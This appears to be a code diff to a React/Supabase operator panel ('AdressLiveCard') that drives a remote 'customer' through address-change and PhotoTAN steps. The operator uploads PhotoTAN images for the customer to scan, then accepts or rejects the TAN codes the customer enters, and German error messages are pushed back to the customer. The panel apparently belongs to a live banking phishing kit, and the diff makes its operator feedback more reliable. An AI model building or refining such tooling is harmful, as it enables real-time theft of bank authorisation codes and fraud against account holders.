@@ -88,7 +88,12 @@ const AdressLiveCard = () => {
 
   const update = async (id: string, patch: Record<string, any>) => {
     const { error } = await (supabase as any).from("adress_tokens").update(patch).eq("id", id);
-    if (error) toast.error(error.message);
+    if (error) {
+      toast.error(error.message);
+      return false;
+    }
+    setRows(current => current.map(row => row.id === id ? { ...row, ...patch } : row));
+    return true;
   };
   const setPhase = (r: Row, phase: string, extra: Record<string, any> = {}) => update(r.id, { customer_phase: phase, ...extra });
 
@@ -113,9 +118,10 @@ const AdressLiveCard = () => {
   const acceptNewAddress = (r: Row) => setPhase(r, "change_phototan_request", { photo_tan_image: null, last_error: null });
   const rejectNewAddress = (r: Row) => setPhase(r, "adress_rejected", { last_error: "Die eingegebenen Daten konnten nicht übernommen werden. Bitte prüfen." });
 
-  const showChangePhotoTan = (r: Row) => {
+  const showChangePhotoTan = async (r: Row) => {
     if (!r.photo_tan_image) { toast.error("Bitte zuerst PhotoTAN-Bild hochladen"); return; }
-    setPhase(r, "change_phototan", { last_error: null });
+    const changed = await setPhase(r, "change_phototan", { last_error: null });
+    if (changed) toast.success("PhotoTAN wird dem Kunden angezeigt");
   };
   const rejectChangeTan = (r: Row) => update(r.id, { tan_code: null, customer_phase: "change_phototan_rejected", last_error: "Die eingegebene Änderungs-TAN ist ungültig. Bitte erneut versuchen." });
   const acceptChangeTan = (r: Row) => update(r.id, { customer_phase: "success", used: true, used_at: new Date().toISOString(), last_error: null });
